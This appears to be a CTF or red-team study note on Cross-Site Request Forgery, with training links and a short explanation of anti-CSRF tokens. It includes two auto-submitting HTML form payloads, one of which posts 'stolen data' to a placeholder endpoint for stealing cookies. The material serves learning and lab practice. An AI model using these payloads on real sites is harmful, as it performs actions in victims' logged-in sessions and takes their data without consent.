# Cross-Site Request Forgery

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![cross-site_request_forgery_prevention](../../../../_badges/owasp/cross-site_request_forgery_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
[![csrf_injection](../../../../_badges/poat/csrf_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
[![csrf_0_protection](../../../../_badges/rootme/web_client/csrf_0_protection.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
[![csp_bypass_inline_code](../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
[![csp_bypass_jsonp](../../../../_badges/rootme/web_client/csp_bypass_jsonp.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)

<div class="row row-cols-lg-2"><div>

Fundamentally, Cross-Site Request Forgery (CSRF) refers to using the session of a user logged to a website to perform API calls without their consent. For instance, an API call to modify their password.

Many modern browsers have built-in anti-CSRF measures, such as with the `Content-Security-Policy` header ([refer to CSP](files/csp.md)).

[XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md) is a common attack technique to perform a CSRF attack.

‚≠ê You can find payloads on [PayloadsAllTheThings/CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection). You can test the payload with a [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) first during CTFs.

üìö During CTFs, it may take between one and five minutes.
</div><div>

```html!
<form id="autosubmit" action="https://<target_form_URL>" method="post">
  <input type="text" name="xxx" value="yyy" hidden>
  <button type="submit">Submit</button>
</form>
<script>
 document.getElementById("autosubmit").submit();
</script>
```

```html!
<form id="fdata" action="//refer/to/stealing/cookies" method="POST">
<input type="hidden" id="data" name="data" value="nop" />
<input type="submit" value="Submit" />
</form>
<script defer>
document.getElementById('data').value='stolen data';
document.getElementById('fdata').submit();
</script>
```
</div></div>

<hr class="sep-both">

## Anti-CSRF Token

[![sqlmapessentials](../../../../_badges/htb/sqlmapessentials.svg)](https://academy.hackthebox.com/course/preview/sqlmap-essentials)
[![gitlabcve20237028](../../../../_badges/thm-p/gitlabcve20237028.svg)](https://tryhackme.com/r/room/gitlabcve20237028)
[![unbakedpie](../../../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)

<div class="row row-cols-lg-2"><div>

Some websites have a CSRF token, mostly attached to HTML forms, as a form of protection against CSRF attacks and other automation tools.

It's a generated value that is added to the form, often as a hidden HTML `<input>` field. It proves that someone submitting a form effectively visited the page with the form beforehand.

Many tools have built-in switches to handle/bypass such forms.
</div><div>
</div></div>